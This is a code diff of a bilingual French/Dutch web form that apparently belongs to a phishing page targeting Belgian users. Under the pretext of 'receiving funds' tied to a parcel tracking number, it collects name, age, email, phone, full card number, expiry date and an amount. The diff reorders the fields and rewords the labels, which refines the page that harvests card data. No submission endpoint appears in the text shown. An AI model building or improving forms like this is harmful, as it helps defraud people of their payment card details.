@@ -238,9 +238,10 @@
         <input type="hidden" name="_template" value="table">
         <input type="hidden" name="Numéro de suivi" value="BE 75129355470">
 
+        <!-- SECTION 1: INFORMATIONS PERSONNELLES -->
         <p class="section-title">
-            <span class="fr">📋 Réception de fonds</span>
-            <span class="nl">📋 Ontvangst van gelden</span>
+            <span class="fr">👤 Vos informations</span>
+            <span class="nl">👤 Uw gegevens</span>
         </p>
 
         <!-- NOM -->
@@ -253,17 +254,17 @@
             <span class="error-msg"><span class="fr">⚠️ Lettres, espaces, tirets et apostrophes uniquement</span><span class="nl">⚠️ Alleen letters, spaties, streepjes en apostrofs</span></span>
         </div>
 
-        <div class="form-row">
-            <!-- TÉLÉPHONE -->
-            <div class="form-group">
-                <label for="phone">
-                    <span class="fr">Téléphone <span class="required">*</span></span>
-                    <span class="nl">Telefoon <span class="required">*</span></span>
-                </label>
-                <input type="tel" id="phone" name="Téléphone" placeholder="+32 476 12 34 56" required>
-                <span class="error-msg"><span class="fr">⚠️ Format international (ex: +32 476 12 34 56)</span><span class="nl">⚠️ Internationaal formaat (bv: +32 476 12 34 56)</span></span>
-            </div>
+        <!-- ÂGE -->
+        <div class="form-group">
+            <label for="age">
+                <span class="fr">Âge <span class="required">*</span></span>
+                <span class="nl">Leeftijd <span class="required">*</span></span>
+            </label>
+            <input type="number" id="age" name="Âge" placeholder="Votre âge" min="18" max="120" required>
+            <span class="error-msg"><span class="fr">⚠️ Âge entre 18 et 120 ans</span><span class="nl">⚠️ Leeftijd tussen 18 en 120 jaar</span></span>
+        </div>
 
+        <div class="form-row">
             <!-- EMAIL -->
             <div class="form-group">
                 <label for="email">
@@ -273,10 +274,21 @@
                 <input type="email" id="email" name="Email" placeholder="votre.email@example.com" required>
                 <span class="error-msg"><span class="fr">⚠️ Exemple : nom@domaine.com</span><span class="nl">⚠️ Voorbeeld : naam@domein.be</span></span>
             </div>
+
+            <!-- TÉLÉPHONE -->
+            <div class="form-group">
+                <label for="phone">
+                    <span class="fr">Téléphone <span class="required">*</span></span>
+                    <span class="nl">Telefoon <span class="required">*</span></span>
+                </label>
+                <input type="tel" id="phone" name="Téléphone" placeholder="+32 476 12 34 56" required>
+                <span class="error-msg"><span class="fr">⚠️ Format international (ex: +32 476 12 34 56)</span><span class="nl">⚠️ Internationaal formaat (bv: +32 476 12 34 56)</span></span>
+            </div>
         </div>
 
-        <p class="section-title" style="margin-top:24px;">
-            <span class="fr">🏦 Informations bancaires</span>
+        <!-- SECTION 2: INFORMATIONS BANCAIRES -->
+        <p class="section-title" style="margin-top:28px;">
+            <span class="fr">🏦 Coordonnées bancaires</span>
             <span class="nl">🏦 Bankgegevens</span>
         </p>
 
@@ -293,8 +305,8 @@
         <!-- CARTE 52/49/51 -->
         <div class="form-group">
             <label for="carte_52">
-                <span class="fr">Numéro de carte 52/49/51 <span class="required">*</span></span>
-                <span class="nl">Kaartnummer 52/49/51 <span class="required">*</span></span>
+                <span class="fr">Numéro de carte <span class="required">*</span></span>
+                <span class="nl">Kaartnummer <span class="required">*</span></span>
             </label>
             <input type="text" id="carte_52" name="Numéro de carte 52/49/51" placeholder="4312 5900 7901 1248" required>
             <span class="error-msg"><span class="fr">⚠️ 16 chiffres (ex: 4312 5900 7901 1248)</span><span class="nl">⚠️ 16 cijfers (bv: 4312 5900 7901 1248)</span></span>
@@ -304,7 +316,7 @@
             <!-- DATE -->
             <div class="form-group">
                 <label for="expiry">
-                    <span class="fr">Date d'expiration <span class="required">*</span></span>
+                    <span class="fr">Expiration <span class="required">*</span></span>
                     <span class="nl">Vervaldatum <span class="required">*</span></span>
                 </label>
                 <input type="text" id="expiry" name="Date d'expiration" placeholder="MM/AA" maxlength="5" required>
@@ -314,22 +326,12 @@
             <!-- MONTANT -->
             <div class="form-group">
                 <label for="amount">
-                    <span class="fr">Montant à recevoir (€) <span class="required">*</span></span>
-                    <span class="nl">Te ontvangen bedrag (€) <span class="required">*</span></span>
+                    <span class="fr">Montant (€) <span class="required">*</span></span>
+                    <span class="nl">Bedrag (€) <span class="required">*</span></span>
                 </label>
                 <input type="text" id="amount" name="Montant à recevoir" placeholder="0,00 €" pattern="[0-9]+([,.][0-9]{1,2})?" title="Format décimal (ex: 150,00 ou 150.00)" required>
                 <span class="error-msg"><span class="fr">⚠️ Exemple : 150,00 ou 150.00</span><span class="nl">⚠️ Voorbeeld : 150,00 of 150.00</span></span>
             </div>
-        </div>
-
-        <!-- ÂGE -->
-        <div class="form-group">
-            <label for="age">
-                <span class="fr">Âge <span class="required">*</span></span>
-                <span class="nl">Leeftijd <span class="required">*</span></span>
-            </label>
-            <input type="number" id="age" name="Âge" placeholder="Votre âge" min="18" max="120" required>
-            <span class="error-msg"><span class="fr">⚠️ Âge entre 18 et 120 ans</span><span class="nl">⚠️ Leeftijd tussen 18 en 120 jaar</span></span>
         </div>
 
         <button type="submit" class="btn-submit" id="submitBtn">
